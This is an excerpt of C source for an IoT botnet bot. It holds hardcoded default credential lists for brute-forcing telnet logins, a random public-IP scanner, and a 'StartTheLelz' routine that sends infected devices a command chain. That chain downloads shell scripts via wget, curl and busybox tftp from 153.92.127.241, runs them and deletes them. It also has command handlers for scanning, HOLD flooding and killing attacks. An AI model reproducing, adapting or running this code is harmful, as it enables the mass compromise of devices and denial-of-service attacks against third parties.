...
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "netgear\0", "cisco\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "netgear\0", "cisco\0", "123456789\0"};
...
in_addr_t getRandomPublicIP()
{
        ...
        while(
				...
				(ipState[1] == 185 && ipState[2] == 11) ||
				(ipState[1] == 185 && ipState[2] == 62) ||
				(ipState[1] == 66 && ipState[2] == 150) ||
				(ipState[1] == 66 && ipState[2] == 151) ||
				(ipState[1] == 72 && ipState[2] == 5) ||
				(ipState[1] == 216 && ipState[2] == 52) ||
				(ipState[1] == 74 && ipState[2] == 221) ||
				(ipState[1] == 192 && ipState[2] == 227) ||
				(ipState[1] == 74 && ipState[2] == 201) ||
				(ipState[1] == 188 && ipState[2] == 209) ||
				(ipState[1] == 192 && ipState[2] == 99) ||
				(ipState[1] == 167 && ipState[2] == 114) ||
				(ipState[1] == 208 && ipState[2] == 146) ||
				(ipState[1] == 192 && ipState[2] == 99) ||
				(ipState[1] == 142 && ipState[2] == 4) ||
				(ipState[1] == 23 && ipState[2] == 94) ||
				(ipState[1] == 192 && ipState[2] == 3) ||
				(ipState[1] == 198 && ipState[2] == 12) ||
				(ipState[1] == 199 && ipState[2] == 188) ||
				(ipState[1] == 199 && ipState[2] == 21) ||
				(ipState[1] == 192 && ipState[2] == 210) ||
				(ipState[1] == 172 && ipState[2] == 245) ||
				(ipState[1] == 198 && ipState[2] == 23) ||
                (ipState[1] >= 224)
        )
        {
                ipState[1] = rand() % 224;
...
void StartTheLelz(char *ip)
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 9:
				{
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://153.92.127.241/bins.sh || curl -O http://153.92.127.241/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 153.92.127.241 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 153.92.127.241; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\r\n", 358, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 10;
				}
			...
			case 11:
				{
                    ...
                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                    {
                    	fds[i].totalTimeout = 0;
                    	fds[i].bufUsed = 0;
                    	send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://153.92.127.241/bins.sh || curl -O http://153.92.127.241/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 153.92.127.241 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 153.92.127.241; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\r\n", 358, MSG_NOSIGNAL);
...
void processCmd(int argc, unsigned char *argv[])
{
	...
	if(!strcmp(argv[0], "SCANNER"))
	{
		...
		if(!strcmp(argv[1], "ON"))
		{
			...
			for(i = 0;i<threads;i++){
					pthread_create(&thread, NULL, &StartTheLelz, (void *) NULL);
			}
			
			StartTheLelz(1); /* and one on the main thread */
			_exit(0);
		}
	}
	...
	if(!strcmp(argv[0], "HOLD"))
	{
		...
		if(strstr(ip, ",") != NULL)
		{
			...
			// sockprintf(mainCommSock, "HOD Flooding %s:%d for %d seconds.", ip, port, time);
	...
	if(!strcmp(argv[0], "KILL"))
	{
		...
		if(killed > 0)
		{
			...
			sockprintf(mainCommSock, "NO ATTACKS WERE KILLED");
		}
	}
...
{	
	...
	signal(SIGPIPE, SIG_IGN); /* because why not ignore useless annoying signals */ 
